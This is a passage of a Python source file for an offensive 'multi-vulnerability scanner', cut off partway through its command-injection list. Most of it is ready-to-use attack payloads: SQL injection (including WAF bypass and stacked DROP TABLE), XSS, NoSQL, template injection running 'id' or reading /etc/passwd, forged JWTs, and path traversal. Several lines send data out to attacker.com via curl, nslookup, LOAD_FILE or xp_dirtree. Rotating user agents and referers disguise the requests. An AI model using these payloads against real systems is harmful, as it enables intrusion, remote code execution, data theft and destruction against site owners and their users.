#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Al-Shammari - Multi-Vulnerability Scanner
# Cross-Platform: Linux/Windows/macOS/Termux

import sys, os, re, time, random, urllib.request, urllib.parse, urllib.error, argparse, ssl, platform, hashlib, base64
from urllib.parse import urlparse, parse_qs

# Cross-platform compatibility
PY3 = sys.version_info[0] >= 3
IS_WIN = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"
IS_TERMUX = "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ
IS_KALI = os.path.exists("/etc/kali-release") if IS_LINUX else False
IS_ARCH = os.path.exists("/etc/arch-release") if IS_LINUX else False

# Color support
USE_COLORS = True
if IS_WIN:
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except:
        USE_COLORS = False
if IS_TERMUX:
    USE_COLORS = True

class C:
    if USE_COLORS:
        R="\033[1;31m";G="\033[1;32m";Y="\033[1;33m";B="\033[1;34m"
        M="\033[1;35m";CY="\033[1;36m";W="\033[1;37m";X="\033[0m"
        BO="\033[1m";U="\033[4m";D="\033[2m"
    else:
        R=G=Y=B=M=CY=W=X=BO=U=D=""

ANSI_PAT = re.compile(r"\x1b\[[0-9;]*m")

BANNER = (
    C.R+"""╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ████  ██      █████ ██  ██  ████  ██   ████   ██ ████  █████   ████      ║
║    ██  ██ ██     ██     ██  ██ ██  ██ ███ ██████ █████  ██ ██  ██   ██       ║
║    ██████ ██      ████  ██████ ██████ ██ █ ████ █ ████████ █████    ██       ║
║    ██  ██ ██         ██ ██  ██ ██  ██ ██   ████   ████  ██ ██ ██    ██       ║
║    ██  ██ ████████████  ██  ██ ██  ██ ██   ████   ████  ██ ██  ██  ████      ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║          ~  AL SHAMMARI  ~    Multi-Vulnerability Scanner   [v2.0]           ║
║       SQLi  XSS  IDOR  Auth  SSTI  NoSQL  XXE  CMDi  LFI  JWT  GraphQL       ║
╚══════════════════════════════════════════════════════════════════════════════╝"""
    +C.X+"\n"
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q=test", "https://www.bing.com/search?q=test",
    "https://www.yahoo.com/search?q=test", "https://duckduckgo.com/?q=test",
    "https://www.google.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.linkedin.com/", "https://www.reddit.com/", "https://www.youtube.com/",
    "https://www.wikipedia.org/", "https://www.github.com/", "https://www.stackoverflow.com/",
    "https://www.amazon.com/", "https://www.netflix.com/",
]

STD_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0", "DNT": "1", "TE": "trailers",
}

SQLI = {
    "basic": [
        "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "' OR 1=1 #",
        "admin' --", "admin' #", "' OR ''='", "1' OR '1'='1",
        "') OR ('1'='1", "')) OR (('1'='1", "' OR '1'='1' /*",
        "1' OR '1'='1' -- -", "admin'/*", "' OR 1=1#", "' OR 1=1/*",
        "admin' OR 1=1--", "' OR 'a'='a", "1' OR '1'='1'--",
        "' OR 1=1 -- -", "1' OR '1'='1' /*",
    ],
    "union": [
        "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --", "' UNION SELECT NULL,NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
        "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT username,password FROM users --",
        "' UNION SELECT table_name,NULL FROM information_schema.tables --",
        "' UNION SELECT column_name,NULL FROM information_schema.columns --",
        "' UNION SELECT @@version,NULL --", "' UNION SELECT database(),user() --",
        "' UNION SELECT load_file('/etc/passwd'),NULL --",
        "' UNION SELECT schema_name,NULL FROM information_schema.schemata --",
        "' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users --",
    ],
    "blind": [
        "' AND 1=1 --", "' AND 1=2 --", "' AND SLEEP(5) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
        "' AND IF(1=1,SLEEP(5),0) --", "' AND IF(1=2,SLEEP(5),0) --",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' AND '1'='1' --", "' AND '1'='2' --",
        "' AND LENGTH(database())>0 --", "' AND 1=1#", "' AND 1=2#",
        "' AND 'a'='a' --", "' AND 'a'='b' --",
        "' AND IF(1=1,1,0) --", "' AND IF(1=2,1,0) --",
        "1' AND SLEEP(5)#", "' AND (SELECT COUNT(*) FROM users)>0 --",
    ],
    "error": [
        "'", "''", "' AND '1'='1", "' AND '1'='2", "1'", "1\"",
        "' AND 1=CONVERT(int,(SELECT @@version)) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "' EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
        "' UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) --",
        "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
        "' AND 1=CONVERT(int,@@version) --", "' HAVING 1=1 --",
        "' AND 1=(SELECT TOP 1 CAST(@@version AS INT)) --",
        "' AND 1=CAST((SELECT @@version) AS INT) --",
        "' AND 1=(SELECT CONVERT(int,db_name())) --",
        "' AND GTID_SUBTRACT('a','b') --",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e)) --",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x3a,version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "' PROCEDURE ANALYSE() --",
        "' AND ExtractValue(1,concat(0x7e,(SELECT table_name FROM information_schema.columns WHERE column_name='password' LIMIT 1),0x7e)) --",
        "') AND 1=CONVERT(int,@@version) --",
        "\" AND 1=CONVERT(int,@@version) --",
        "' AND 1=(SELECT CAST(@@version AS INT)) --",
        "' AND EXP(~(SELECT * FROM (SELECT CONCAT(version(),FLOOR(RAND(0)*2)))x)) --",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(@@version)) USING utf8))) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))a FROM information_schema.tables GROUP BY a)b) --",
        "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) --",
        "1' AND row(1,1)>(SELECT 1,2 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    ],
    "time": [
        "' AND SLEEP(5) --", "' AND SLEEP(10) --",
        "' WAITFOR DELAY '0:0:5' --", "'; WAITFOR DELAY '0:0:5' --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
        "' AND IF(1=1,SLEEP(5),0) --", "' AND IF(1=2,SLEEP(5),0) --",
        "1; SELECT SLEEP(5) --", "1' AND BENCHMARK(10000000,SHA1('test')) --",
        "' AND pg_sleep(5) --", "'; SELECT pg_sleep(5) --",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
        "' AND SLEEP(3)=0 LIMIT 1 --", "1' AND SLEEP(5)#",
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' AND SLEEP(5)-- -", "\" AND SLEEP(5)--",
        "') AND SLEEP(5)--", "')) AND SLEEP(5)--",
        "1' AND SLEEP(5)-- -", "1) AND SLEEP(5)--",
        "1)) AND SLEEP(5)--", "1 AND SLEEP(5)",
        "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
        "'X' WHERE 1=1; WAITFOR DELAY '0:0:5'--",
        "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
        "1%' AND SLEEP(5) --",
        "' AND IF(SUBSTR(@@version,1,1)>0,SLEEP(5),0) --",
        "' AND IF(ASCII(SUBSTRING(USER(),1,1))>0,SLEEP(5),0) --",
        "' AND IF(LENGTH(database())>0,SLEEP(5),0) --",
        "1)) AND (SELECT * FROM (SELECT(SLEEP(5)))x) --",
        "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))ZWC) --",
        "' /*!50000AND*/ SLEEP(5) --",
        "' AND BENCHMARK(5000000,MD5('test')) --",
        "' AND BENCHMARK(2000000,SHA2('test',256)) --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B) --",
        "1' OR SLEEP(5) --", "'||SLEEP(5)#",
        "1); WAITFOR DELAY '0:0:5' --",
        "' AND pg_sleep(5)||pg_sleep(5) --",
    ],
    "graphql": [
        "{\"query\":\"{__schema{types{name}}}\"}",
        "{\"query\":\"{__type(name:\\\"User\\\"){fields{name}}}\"}",
        "{\"query\":\"{user(id:1){id,email,password}}\"}",
        "{\"query\":\"{users{id,email,password}}\"}",
        "{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"' OR '1'='1\\\")}\"}",
        "{\"query\":\"{user(id:\\\"1' OR '1'='1 --\\\"){id}}\"}",
        "{\"query\":\"{user(filter:{id:{_eq:\\\"1' UNION SELECT 1,2,3--\\\"}}){id}}\"}",
        "{\"query\":\"{__schema{queryType{name}}mutationType{name}}}\"}",
        "{\"query\":\"{admin{users{id,username,password}}\"}",
        "{\"query\":\"{search(q:\\\"' OR 1=1--\\\"){id}}\"}",
    ],
    "jwt": [
        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"role\":\"admin\"}.",
        "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"role\":\"superadmin\"}.",
        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"1\",\"role\":\"admin\",\"exp\":9999999999}.",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
        "{\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 1--\"}.{\"sub\":\"admin\"}.",
        "{\"alg\":\"HS256\",\"kid\":\"../../../../etc/passwd\"}.{\"sub\":\"admin\"}.",
    ],
    "lfi": [
        "../../../../etc/passwd", "../../etc/passwd",
        "../../../../../../etc/passwd%00", "....//....//....//etc/passwd",
        "/etc/passwd", "....\\....\\....\\....\\etc\\passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://input", "expect://id", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=",
        "/proc/self/environ", "/proc/self/cmdline", "/var/log/apache2/access.log",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "../../../../proc/self/environ", "../../../../var/www/html/.env",
    ],
    "mssql": [
        "' OR 1=1 --", "'; EXEC xp_cmdshell('whoami') --",
        "' UNION SELECT @@version,NULL --", "' HAVING 1=1 --",
        "'; WAITFOR DELAY '0:0:5' --",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
        "' UNION SELECT name,NULL FROM master..sysdatabases --",
        "'; EXEC xp_cmdshell 'net user' --",
    ],
    "postgresql": [
        "' OR 1=1 --", "' UNION SELECT NULL,NULL --",
        "' AND 1=CAST((SELECT version()) AS INT) --",
        "'; SELECT pg_sleep(5) --", "' UNION SELECT tablename,NULL FROM pg_tables --",
        "' UNION SELECT usename,NULL FROM pg_user --",
        "' UNION SELECT datname,NULL FROM pg_database --",
    ],
    "oracle": [
        "' OR 1=1 --", "' UNION SELECT NULL FROM DUAL --",
        "' AND 1=CTXSYS.DRITHSX.SN(1,'x') --",
        "' UNION SELECT table_name,NULL FROM all_tables --",
        "' UNION SELECT username,NULL FROM all_users --",
        "' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)=1 --",
        "' UNION SELECT banner,NULL FROM v$version --",
    ],
    "waf": [
        "'%20OR%20'1'%3D'1", "'%20OR%201%3D1%20--", "'%0AOR%0A1%3D1%0A--",
        "'%09OR%091%3D1%09--", "/*!50000OR*/ 1=1 --", "' OR 1%3d1 --",
        "1'/**/OR/**/1=1--", "'%20UNION%20SELECT%20NULL--",
        "'%0bOR%0b1=1--", "'%0cOR%0c1=1--",
        "'/**/OR/**/1=1/**/--", "'%20OR%20'a'%3D'a",
    ],
    "auth": [
        "' OR '1'='1' --", "admin' --", "admin' #", "' OR 1=1 --",
        "' OR ''='", "admin' OR '1'='1", "' OR 'a'='a' --",
        "1' OR '1'='1' --", "admin' OR ''='", "1' UNION SELECT 1,1,1 --",
        "' OR 1=1/*", "admin'/*'*/--", "admin' AND 1=1--",
        "' OR 1=1 -- -", "admin' OR 1=1#", "' OR 'x'='x'#",
    ],
    "polyglot": [
        "' OR 1=1;-- -", "') OR ('1'='1')--", "')) OR 1=1-- -",
        "' OR 1=1 LIMIT 1--", "\") OR 1=1--", "')/**/OR/**/('1'='1",
        "'/**/UNION/**/SELECT/**/NULL--", "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        "' OR TRUE--", "' OR NOT FALSE--", "' OR 1 LIKE 1--",
        "' OR 1 REGEXP 1--", "' OR 1 RLIKE 1--", "' OR 'a' BETWEEN 'a' AND 'z'--",
    ],
    "stacked": [
        "'; SELECT SLEEP(3)--", "'; SELECT pg_sleep(3)--",
        "'; WAITFOR DELAY '0:0:3'--", "'; EXEC xp_cmdshell('whoami')--",
        "'; SELECT @@version--", "'; SELECT version()--", "'; SELECT user()--",
        "'; DROP TABLE temp--", "'; INSERT INTO audit_log(message) VALUES('test')--",
        "1; SELECT SLEEP(3)--", "1;WAITFOR DELAY '0:0:3'--",
    ],
    "json": [
        "\" OR \"1\"=\"1", "\" OR 1=1--", "\"} OR 1=1--",
        "\"} UNION SELECT NULL--", "\",\"$where\":\"1==1",
        "\" OR sleep(3)--", "\" AND IF(1=1,SLEEP(3),0)--",
        "\\\" OR \\\"1\\\"=\\\"1", "admin\") OR (\"1\"=\"1",
    ],
    "second_order": [
        "admin'--", "test' OR '1'='1", "x'); UPDATE users SET role='admin'--",
        "x'); INSERT INTO logs(msg) VALUES(database())--",
        "x'||(SELECT version())||'", "x'+(SELECT @@version)+'",
        "${jndi:ldap://127.0.0.1/a}", "{{7*7}}", "<%= 7*7 %>",
    ],
    "oob": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\x'))--",
        "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
        "' AND extractvalue(1,concat(0x7e,(select database()),0x7e))--",
        "' AND updatexml(1,concat(0x7e,(select user()),0x7e),1)--",
        "'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--",
    ],
}

XSS = {
    "reflected": [
        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "<iframe src='javascript:alert(1)'>",
        "<img src=x onerror=alert(document.domain)>", "<svg/onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "<video><source onerror='alert(1)'>",
        "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
        "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
        "<a href='javascript:alert(1)'>click</a>", "<button onclick=alert(1)>click</button>",
        "<div onmouseover='alert(1)'>hover</div>", "<img src=x:x onerror=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "'\"><script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>",
        "'\"><svg onload=alert(1)>", "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "events": [
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
        "<video onerror=alert(1)><source>", "<audio onerror=alert(1)><source>",
        "<select onchange=alert(1)><option>1</option></select>",
        "<form onsubmit=alert(1)><input type=submit>",
        "<iframe onload=alert(1)>", "<object onerror=alert(1)>",
        "<embed onload=alert(1)>", "<table background=javascript:alert(1)>",
        "<div style=width:1px onmouseover=alert(1)>",
    ],
    "waf": [
        "<ScRiPt>alert(1)</ScRiPt>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<svg%20onload=alert(1)>", "<svg/onload%3Dalert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E", "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        "<img src=x onerror=\\x61lert(1)>", "<img src=x onerror=\\u0061lert(1)>",
        "<img src=x onerror=eval('al'+'ert(1)')>", "<svg onload=alert&#40;1&#41;>",
        "<svg onload=alert&#x28;1&#x29;>", "<svg/onload=alert(1)//",
        "<!--><svg onload=alert(1)>", "<svg><script>alert&#40;1&#41;</script></svg>",
        "<img src=x onerror=alert(1)>.gif", "';alert(1);//",
        "\"><script>alert(1)</script>", "'-alert(1)-'",
        "';window.alert(1);//", "javascript://%250Aalert(1)",
    ],
    "dom": [
        "javascript:alert(document.domain)", "javascript:alert(document.cookie)",
        "javascript:alert(window.name)", "javascript:alert(location.hash.substr(1))",
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=eval(location.hash.substr(1))>",
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.referrer)",
        "javascript:alert(document.URL)",
        "javascript:alert(document.baseURI)",
        "javascript:alert(window.location)",
        "javascript:alert(document.documentElement.outerHTML)",
        "<img src=x onerror=eval(location.hash.slice(1))>",
        "<svg onload=fetch('/admin').then(r=>r.text()).then(t=>new Image().src='//x?a='+btoa(t)))>",
        "javascript:document.write('<img src=x onerror=alert(1)>')",
        "javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'",
    ],
"mutation": [
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<style><style /><img src=x onerror=alert(1)>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<svg><p><style><g title=\"</style><img src=x onerror=alert(1)>\">",
        "<noscript><g title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<form><button formaction=javascript:alert(1)>click",
        "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'>",
        "<xmp><img src=x onerror=alert(1)></xmp>",
        "<noembed><img src=x onerror=alert(1)></noembed>",
        "<noframes><img src=x onerror=alert(1)></noframes>",
        "<style><img src=x onerror=alert(1)></style>",
        "<table background='javascript:alert(1)'></table>",
        "<a href=\"?payload=1\" onclick=alert(1)>x",
        "<image src=x onerror=alert(1)>",
        "<image src href=x onerror=alert(1)>",
    ],
"import": [
        "<script import=\"https://x.example/x\"></script>",
        "<link rel=import href=javascript:alert(1)>",
        "<script src=javascript:alert(1)></script>",
        "<script src=data:text/javascript,alert(1)></script>",
        "<iframe src=javascript:alert(1)></iframe>",
        "<object data=javascript:alert(1)></object>",
        "<embed src=javascript:alert(1)>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<isindex action=javascript:alert(1) type=submit>",
        "<base href=javascript:alert(1)//>",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
        "\"><svg/onload=alert(1)>", "'><svg/onload=alert(1)>",
        "</title><svg/onload=alert(1)>", "</textarea><svg/onload=alert(1)>",
        "</script><img src=x onerror=alert(1)>", "--><svg/onload=alert(1)>",
        "`-alert(1)-`", "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
    ],
    "svg": [
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x to=y>",
        "<svg><foreignObject onload=alert(1)>", "<svg><use href=data:image/svg+xml,<svg id=x onload=alert(1)>#x>",
        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc>",
        "<svg><a href=javascript:alert(1)>x</a>", "<svg onload=confirm(1)>",
    ],
    "csp": [
        "<script nonce=anything>alert(1)</script>",
        "<link rel=preload as=script href=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
        "<base href=javascript:alert(1)//><a href=/test>click</a>",
        "<form action=javascript:alert(1)><input type=submit>",
    ],
    "framework": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{[].pop.constructor('alert(1)')()}}",
        "{{$eval('alert(1)')}}", "{{7*7}}",
        "${alert(1)}", "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
        "<img src=x v-on:error=alert(1)>", "<template><img src=x onerror=alert(1)></template>",
    ],
}

NOSQL = {
    "mongo": [
        "{'$ne': null}", "{'$gt': ''}", "{'$regex': '.*'}", "{'$where': '1==1'}",
        "admin' || '1'=='1", "admin' && this.password.match(/.*/)//",
        "username[$ne]=x&password[$ne]=x", "username[$regex]=.*&password[$regex]=.*",
        "{\"$or\":[{}, {\"a\":\"a\"}]}", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
        "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
        "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
        "[$ne]=1", "[$gt]=", "[$regex]=.*", "[$exists]=true",
        "[$where]=this.password.match(/.*/)",
        "[$mod]=1", "[$nin]=", "[$in]=[\"admin\"]",
        "{\"$and\":[{\"username\":\"admin\"},{\"password\":{\"$ne\":\"\"}}]}",
        "{\"$or\":[{\"username\":\"admin\"},{\"password\":{\"$ne\":\"\"}}]}",
        "{\"$nor\":[{\"username\":\"invalid\"},{\"password\":\"invalid_pass\"}]}",
        "username=admin&password[$ne]=wrong",
        "username=admin&password[$regex]=^(a|b|c)",
        "username=admin&password[$gt]=ZZZZ",
        "[$type]=string", "[$eq]=", "[$lte]=z",
    ],
    "javascript": [
        "'; return true; var x='", "'; return this.username == 'admin'; var x='",
        "'||'1'=='1", "'||sleep(3000)||'", "'; while(true){}; var x='",
        "1;return true", "1;return this.password==this.password",
        ";var date=current_date();return date>0 //'",
        "';return this.role=='admin' //'",
        "';return 'admin'=='admin' //'",
        "';return true //' || '1'=='1",
        "'||this.username.match(/./)//",
        "';return this.constructor.constructor('return 1')()//",
        "';return global.process.mainModule.require('fs').readdirSync('/')//",
    ],
    "redis": [
        "CONFIG GET *", "*1\r\n$7\r\nCONFIG\r\n$3\r\nGET\r\n$1\r\n*\r\n",
        "EVAL \"return 1\" 0", "FLUSHALL", "KEYS *",
        "GET user:admin", "SET hack 'evil' 0",
        "SLAVEOF attacker.com:6379",
        "DEBUG SET-ACTIVE-EXPIRE 0",
    ],
    "cassandra": [
        "' OR '1'='1; --", "admin' ALLOW FILTERING; --",
        "' ; DROP TABLE users; --", "' UNION SELECT * FROM system_schema.tables; --",
    ],
}

SSTI = {
    "generic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "${{7*7}}", "{{7*'7'}}"],
    "jinja2": [
        "{{config}}", "{{self}}", "{{request}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('whoami').read()}}",
        "{{config.items()} }", "{{namespace}}", "{{g}}",
        "{{url_for.__globals__.__builtins__.eval('1+1')}}",
        "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    ],
    "twig": ["{{_self}}", "{{dump(app)}}", "{{['id']|filter('system')}}", "{{'/etc/passwd'|file_excerpt(1,30)}}"],
    "freemarker": ["${7*7}", "${.version}", "${'freemarker.template.utility.Execute'?new()('id')}"],
    "velocity": ["#set($x=7*7)$x", "#set($e='e')${e}", "#evaluate('7*7')"],
    "mako": ["${7*7}", "${self.module.cache.util.os.popen('id').read()}"],
    "pebble": ["{{7*7}}", "{{%s}}", "%{7*7}"],
    "smarty": ["{7*7}", "{system('id')}"],
    "thymeleaf": ["__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "*{T(java.lang.Runtime).getRuntime().exec('id')}"],
    "ejs": ["<%=7*7%>", "<%=process.mainModule.require('fs').readFileSync('/etc/passwd')%>"],
    "nunjucks": ["{{7*7}}", "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"],
    "pugjs": ["#{7*7}", "#{global.process.mainModule.require('child_process').execSync('id')}"],
    "tornado": ["{{7*7}}", "{%import os%}{{os.popen('id').read()}}"],
    "erb": ["<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>"],
    "smarty_secure": ["{7*7}", "{php}system('id');{/php}", "{if system('id')}{/if}"],
}

CMDI = {
    "unix": [
        ";id", "|id", "&&id", "||id", "`id`", "$(id)", ";whoami", "|whoami",
        ";cat /etc/passwd", "|cat /etc/passwd", "&& sleep 3", "| sleep 3",
        ";nslookup attacker.com", "|curl http://attacker.com/$(whoami)",
        "%0aid", "%0did", "%0aid%0a", "%0did%0d",
